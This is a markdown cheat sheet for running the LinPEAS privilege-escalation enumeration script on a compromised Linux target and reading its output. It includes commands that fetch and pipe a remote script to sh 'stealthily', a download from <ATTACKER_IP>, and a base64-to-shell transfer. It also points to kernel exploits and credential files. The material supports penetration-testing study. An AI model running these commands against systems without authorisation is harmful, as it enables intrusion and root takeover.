# 🛠️ LinPEAS (Linux Privilege Escalation Awesome Script)

> **Category:** Post-Exploitation / Enumeration
> **Goal:** Automate the search for path to root on Linux systems.

---

## 🚀 Execution & Deployment

### 1. In-Memory (Most Stealthy)
Execute without saving the script to the target's hard drive:
```bash
# Using curl
curl -L [https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) | sh

# Using wget
wget -O - [https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) | sh

```

### 2. Local Transfer (Host it yourself)

**On Attacker:** `python3 -m http.server 80`
**On Target:**

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > scan_results.txt

```

---

## 🎨 Reading the Output (Color Guide)

LinPEAS is famous for its color-coded findings. **Focus on these first.**

| Color | Meaning | Probability |
| --- | --- | --- |
| **RED/YELLOW** | **High Priority** | **95% chance this is the PrivEsc vector.** |
| **RED** | **Interesting** | Check this carefully; likely a configuration issue. |
| **LIGHT BLUE** | **Info** | Useful environment data (Users, OS, Kernel). |
| **BLUE** | **System** | Standard binaries and configuration paths. |

---

## 🔍 Key Enumeration Checks

### ⚙️ System & Kernel

* **Kernel Exploits**: Look for "DirtyPipe", "PwnKit", or "DirtyCow" suggestions.
* **Sudo Version**: Checks if the version of `sudo` itself is vulnerable (CVE-2021-3156).

### 🔑 Credentials & Files

* **Sudo -l**: Shows what commands you can run as root (if you have the password).
* **SUID Binaries**: Files with the "s" bit. Cross-reference these with **GTFOBins**.
* **Sensitive Files**: Scans for `.bak`, `config.php`, `.ssh/id_rsa`, and `history` files.

### 🕒 Automation & Tasks

* **Cron Jobs**: Finds scripts run by root on a timer. If the script is writable by you, it's an easy win.

---

## ⚙️ Useful Flags

| Flag | Description |
| --- | --- |
| `-a` | **All**: Deep scan (includes thorough file system search). |
| `-s` | **Superfast**: Skips time-consuming disk searches. |
| `-P` | **Password**: Supply a password to check `sudo -l` automatically. |
| `-o` | **Only Color**: Removes "info" lines to keep output clean. |

---

## 💡 Expert Workflow

1. **Run & Log**: `./linpeas.sh -s > output.txt`
2. **Filter Criticals**: `grep "RED/YELLOW" output.txt`
3. **Pivoting**: If a binary is highlighted (e.g., `/usr/bin/find`), immediately check **GTFOBins** for the specific escalation syntax.
4. **Local Services**: Look at the "Network Information" section for services running on `127.0.0.1` that your initial Nmap scan missed.

---

---

## 💡 Expert One-Liners

```bash
# In-memory execution (no file on disk)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save output with colors (use less -R to view)
./linpeas.sh | tee linpeas_output.txt

# Fast scan + save
./linpeas.sh -s | tee -a /dev/shm/lpe.txt

# Run with password for sudo checks
./linpeas.sh -P 'password123'

# Transfer via base64 (when no wget/curl)
# On attacker: base64 linpeas.sh | xclip
# On target: echo "<base64>" | base64 -d | sh
```

---

## 🔗 Links

- After LinPEAS → cross-reference findings with GTFOBins (https://gtfobins.github.io)
- Alternative: linEnum, linux-exploit-suggester, lse.sh
- Combine with: manual enumeration commands for verification
- Windows equivalent: WinPEAS


